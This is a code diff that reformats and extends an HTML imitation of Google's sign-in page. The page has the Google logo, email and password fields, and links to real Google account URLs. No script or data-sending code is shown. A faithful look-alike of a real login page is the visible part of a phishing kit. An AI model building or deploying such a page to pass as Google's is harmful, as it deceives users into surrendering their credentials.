@@ -10,20 +10,31 @@
     <div class="frame">
         <div class="animated-load" style="display: none;"></div>
         <div class="left">
-            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
+                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+            </svg>
             <h1 class="title">Sign in</h1>
             <h2 class="subtitle">Use your Google Account</h2>
+            <div class="email-display" style="display: none;">
+                <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                </svg>
+                <div class="email-box"></div>
+            </div>
         </div>
         <div class="right">
             <div class="email">
                 <div class="inputBox">
-                    <input type="text" id = 'myTextInput' class = 'type' required="required">
+                    <input type="text" id="myTextInput" class="type" required="required">
                     <span>Email or phone</span>
                 </div>
                 <div class="text">
-                    <a class = 'forgot' href = 'https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com.au%2F&ddm=0&dsh=S-82506344%3A1724029423303778&ec=GAlAmgQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&authuser=0'>Forgot email?</a>
-                <p class = "not" >Not your computer? Use a private browsing window to sign in.</p>
-                <a class = 'learn' href = 'https://support.google.com/accounts?p=signin_privatebrowsing&hl=en'>Learn more about using Guest mode</a>
+                    <a class="forgot" href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com.au%2F&ddm=0&dsh=S-82506344%3A1724029423303778&ec=GAlAmgQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&authuser=0">Forgot email?</a>
+                    <p class="not">Not your computer? Use a private browsing window to sign in.</p>
+                    <a class="learn" href="https://support.google.com/accounts?p=signin_privatebrowsing&hl=en">Learn more about using Guest mode</a>
                 </div>
                 <div class="buttons">
                     <button class="next">Next</button>
@@ -34,7 +45,7 @@
         <div class="password">
             <div class="thing">
                 <div class="pinputBox">
-                    <input type="password" id = 'passwordInput' required="required">
+                    <input type="password" id="passwordInput" required="required">
                     <span>Enter your password</span>
                 </div>
                 <label>
@@ -43,7 +54,7 @@
             </div>
         </div>
     </div>
-    
+
     <a class="language">English (United States)&nbsp;&nbsp;&nbsp;&nbsp;▾</a>
     <a class="bottom" href="https://support.google.com/accounts?hl=en-US&p=account_iph">Terms</a>
     <a class="bottom" href="https://accounts.google.com/TOS?loc=AU&hl=en-US&privacy=true">Privacy</a>
